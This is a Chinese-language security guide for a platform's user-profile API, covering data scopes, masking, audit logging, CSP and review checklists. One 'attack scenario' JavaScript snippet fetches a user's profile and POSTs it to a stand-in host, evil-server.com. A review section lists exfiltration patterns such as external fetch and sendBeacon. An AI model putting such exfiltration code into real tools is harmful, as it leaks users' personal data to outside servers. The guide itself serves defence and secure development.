# 用户数据安全指南

## 🔒 安全概述

本文档说明了用户信息访问的安全机制，以及如何防止恶意工具窃取用户数据。

## ⚠️ 潜在安全风险

### 1. 前端工具可能的恶意行为
- **数据窃取**：恶意工具可以获取用户信息并发送到外部服务器
- **隐私泄露**：敏感信息（邮箱、电话、地址）可能被滥用
- **社交工程**：利用用户信息进行钓鱼攻击

### 2. 攻击场景示例
```javascript
// 恶意工具示例（请勿使用）
const userData = await UserAPI.getUserProfile()
// 将数据发送到攻击者服务器
fetch('https://evil-server.com/steal', {
  method: 'POST',
  body: JSON.stringify(userData)
})
```

## ✅ 已实施的安全措施

### 1. **数据访问分级（Scope）**

API 支持三个访问级别：

#### Basic（基础级别 - 默认）
- ✅ 姓名
- ✅ 城市、国家
- ✅ 邮箱（脱敏）：`abc***@example.com`
- ❌ 不包含电话、地址等敏感信息

#### Social（社交媒体级别）
- ✅ 包含 Basic 级别所有信息
- ✅ 社交媒体账号（TikTok、Instagram、Twitter 等）
- ❌ 不包含电话、地址

#### Full（完整级别 - 需要授权）
- ✅ 包含所有信息
- ✅ 完整邮箱（未脱敏）
- ✅ 电话号码
- ✅ 详细地址
- ✅ 个人简介

### 2. **敏感信息脱敏**

默认情况下，敏感信息会被脱敏处理：

```javascript
// 原始邮箱：john.doe@example.com
// 脱敏后：joh***@example.com

// 原始电话：+1 234 567 8900
// 脱敏后：+1 234 *** ****（如果实施）
```

### 3. **访问审计日志**

系统可以记录所有用户数据访问：

```javascript
// 审计日志示例
[AUDIT] User 123 data accessed by tool 456 with scope: full
[AUDIT] Timestamp: 2025-01-15 10:30:45
[AUDIT] IP: 192.168.1.100
```

启用审计日志：
```bash
# .env 文件
ENABLE_USER_DATA_AUDIT=true
```

### 4. **工具权限管理（推荐实施）**

在数据库中添加工具权限表：

```sql
-- 工具权限表（建议添加）
CREATE TABLE tool_permissions (
  id INTEGER PRIMARY KEY,
  tool_id INTEGER NOT NULL,
  scope TEXT NOT NULL, -- 'basic', 'social', 'full'
  approved_by_admin BOOLEAN DEFAULT FALSE,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

## 🛡️ 安全使用指南

### 对于管理员

#### 1. 审核工具代码
在发布工具前，检查是否有可疑的网络请求：

```javascript
// ⚠️ 可疑代码特征
fetch('http://external-domain.com', ...)  // 向外部域名发送数据
XMLHttpRequest to external domain         // 使用 XHR 发送数据
navigator.sendBeacon(...)                 // 使用 Beacon API
```

#### 2. 设置内容安全策略（CSP）

在 `next.config.js` 中添加：

```javascript
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; connect-src 'self' https://trusted-api.com;"
  }
]
```

#### 3. 限制工具权限

只授予工具必要的最小权限：

```javascript
// 好的做法：只请求需要的信息
const user = await UserAPI.getUserBasicInfo() // 只获取基础信息

// 不好的做法：请求所有信息
const user = await UserAPI.getUserProfile() // 获取所有信息
```

### 对于开发者

#### 1. 最小权限原则

只请求工具真正需要的信息：

```javascript
// ✅ 好的做法
// 如果只需要用户姓名
const basicInfo = await UserAPI.getUserBasicInfo()
const name = basicInfo.name

// ❌ 不好的做法
// 获取所有信息但只用姓名
const fullProfile = await UserAPI.getUserProfile()
const name = fullProfile.name
```

#### 2. 明确告知用户

在工具界面上说明会使用哪些用户信息：

```html
<div class="privacy-notice">
  <p>⚠️ 本工具将使用以下信息：</p>
  <ul>
    <li>✓ 您的姓名</li>
    <li>✓ 您的城市和国家</li>
  </ul>
  <p>我们不会收集或存储您的个人信息。</p>
</div>
```

#### 3. 不要存储用户数据

```javascript
// ❌ 不要这样做
const userData = await UserAPI.getUserProfile()
localStorage.setItem('user', JSON.stringify(userData)) // 不要存储

// ✅ 应该这样做
const userData = await UserAPI.getUserProfile()
// 使用后立即丢弃，不存储
```

### 对于用户

#### 1. 检查工具权限

使用工具前，查看工具说明，了解它会访问哪些信息。

#### 2. 只使用可信工具

- ✅ 使用官方或经过审核的工具
- ⚠️ 谨慎使用第三方工具
- ❌ 不要使用来源不明的工具

#### 3. 定期检查访问日志

如果平台提供访问日志功能，定期检查哪些工具访问了你的信息。

## 🔧 API 使用示例

### 基础级别访问（推荐）

```javascript
// 只获取基础信息（姓名、城市、国家、脱敏邮箱）
const response = await fetch('/api/user/profile-data?scope=basic')
const data = await response.json()

console.log(data.user.name)  // "John Doe"
console.log(data.user.email) // "joh***@example.com" (脱敏)
console.log(data.user.phone) // undefined (不包含)
```

### 社交媒体级别访问

```javascript
// 获取基础信息 + 社交媒体账号
const response = await fetch('/api/user/profile-data?scope=social&toolId=123')
const data = await response.json()

console.log(data.user.name)              // "John Doe"
console.log(data.user.socialMedia.tiktok) // "@johndoe"
console.log(data.user.phone)             // undefined (不包含)
```

### 完整级别访问（需要授权）

```javascript
// 获取完整信息（需要用户明确授权）
const response = await fetch('/api/user/profile-data?scope=full&toolId=123')
const data = await response.json()

if (data.scope === 'full') {
  console.log(data.user.email) // "john.doe@example.com" (完整)
  console.log(data.user.phone) // "+1 234 567 8900"
  console.log(data.user.address) // "123 Main St"
} else {
  console.log('用户未授权访问完整信息')
}
```

## 📋 安全检查清单

### 工具发布前检查

- [ ] 代码中没有向外部域名发送数据
- [ ] 只请求必要的最小权限
- [ ] 在界面上明确说明使用的信息
- [ ] 不在本地存储用户敏感信息
- [ ] 通过了安全审核

### 平台管理员检查

- [ ] 启用了访问审计日志
- [ ] 配置了内容安全策略（CSP）
- [ ] 定期审查工具代码
- [ ] 建立了工具权限管理机制
- [ ] 为用户提供了数据访问日志查看功能

## 🚨 发现安全问题怎么办

### 如果你是用户
1. 立即停止使用可疑工具
2. 联系平台管理员报告问题
3. 修改密码和敏感信息

### 如果你是管理员
1. 立即下架可疑工具
2. 检查访问日志，确定影响范围
3. 通知受影响的用户
4. 修复安全漏洞
5. 加强审核机制

### 如果你是开发者
1. 立即修复安全问题
2. 通知平台管理员
3. 向用户道歉并说明情况
4. 提交修复后的版本

## 🔐 进一步的安全建议

### 1. 实施用户授权机制

```javascript
// 在工具首次使用时，请求用户授权
async function requestUserPermission() {
  const granted = await showPermissionDialog({
    permissions: ['name', 'city', 'social_media'],
    toolName: 'AI Bio Generator'
  })

  if (granted) {
    // 用户同意，可以访问数据
  } else {
    // 用户拒绝，不能访问
  }
}
```

### 2. 实施速率限制

```javascript
// 限制 API 调用频率
// 例如：每个工具每分钟最多调用 10 次
const rateLimit = {
  windowMs: 60 * 1000, // 1 分钟
  max: 10 // 最多 10 次请求
}
```

### 3. 加密敏感数据传输

```javascript
// 使用 HTTPS
// 在生产环境强制使用 HTTPS
if (process.env.NODE_ENV === 'production' && !request.secure) {
  return redirect('https://' + request.hostname + request.url)
}
```

### 4. 定期安全审计

- 每月审查访问日志
- 每季度进行安全测试
- 及时更新依赖包
- 关注安全漏洞公告

## 📚 相关资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## 📞 联系方式

如果发现安全问题，请联系：
- 安全团队邮箱：security@your-domain.com
- 紧急热线：+1-XXX-XXX-XXXX

---

**最后更新：2025-01-15**

**版本：1.0**
